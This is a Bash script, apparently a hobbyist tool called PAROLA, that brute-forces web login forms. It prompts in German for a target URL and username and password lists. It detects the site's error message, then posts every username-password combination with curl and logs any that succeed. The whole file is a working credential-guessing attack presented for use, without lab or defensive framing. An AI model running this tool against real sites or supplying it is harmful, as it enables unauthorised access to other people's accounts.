#!/bin/bash

echo
echo
echo

echo "                   _____  _______  ______  _____         _______ "
echo "                  |_____] |_____| |_____/ |     | |      |_____|"
echo "                  |       |     | |    \_ |_____| |_____ |     |"
echo

echo
echo "                                               created by 3mmooo"
echo
echo


#!/bin/bash

# Benutzereingaben abfragen und Standardwerte setzen
read -p "			Geben Sie die Ziel-URL ein (z.B. https://3mmooo.com): " url
read -p "			Geben Sie den Namen der Logdatei ein: " logfile

# Benutzername abfragen oder Liste von Benutzernamen verwenden
read -p "			Geben Sie den Benutzernamen ein (leer lassen für Benutzerliste): " username
if [ -z "$username" ]; then
    read -p "			Geben Sie den Pfad zur Benutzerliste ein: " userlist
fi

# Passwort abfragen oder Liste von Passwörtern verwenden
read -p "			Geben Sie das Passwort ein (leer lassen für Passwortliste): " password
if [ -z "$password" ]; then
    read -p "			Geben Sie den Pfad zur Passwortliste ein: " passwords
fi

# Logdatei initialisieren
> "$logfile"

# Funktion zur Testanfrage und Ermittlung der Erfolgsnachricht
function get_success_message {
    local test_username=$1
    local test_password=$2
    local response=$(curl -s -d "username=$test_username&password=$test_password" -X POST $url)
    echo "$response" | grep -oP '(?<=<p class="error-message">).*?(?=</p>)'
}

# Testanfrage durchführen, um Erfolgsnachricht zu ermitteln
if [ -z "$username" ]; then
    test_username=$(head -n 1 "$userlist")
else
    test_username=$username
fi

if [ -z "$password" ]; then
    test_password=$(head -n 1 "$passwords")
else
    test_password=$password
fi

success_message=$(get_success_message "$test_username" "$test_password")
if [ -z "$success_message" ]; then
    echo "		Keine Erfolgsnachricht gefunden. Bitte überprüfen Sie die Testanfrage."
    exit 1
fi

echo "			Automatisch erkannte Erfolgsnachricht: $success_message"

attempt_count=0
success_count=0

# Funktion zum Durchgehen der Kombinationen
function brute_force {
    local user=$1
    local passlist=$2
    while IFS= read -r password; do
        attempt_count=$((attempt_count + 1))
        response=$(curl -s -d "username=$user&password=$password" -X POST $url)
        if [[ $response != *"$success_message"* ]]; then
            echo "Password found for $user: $password" | tee -a "$logfile"
            success_count=$((success_count + 1))
            break
        else
            echo "Failed for $user: $password"
        fi
    done < "$passlist"
}

# Benutzername und Passwortliste durchgehen
if [ -n "$username" ]; then
    brute_force "$username" "$passwords"
else
    while IFS= read -r user; do
        brute_force "$user" "$passwords"
    done < "$userlist"
fi

# Zusammenfassen der Statistiken
echo "			Total attempts: $attempt_count" | tee -a "$logfile"
echo "			Successful attempts: $success_count" | tee -a "$logfile"
echo "			Failed attempts: $((attempt_count - success_count))" | tee -a "$logfile"

echo "			Ergebnisse wurden in der Datei $logfile gespeichert."
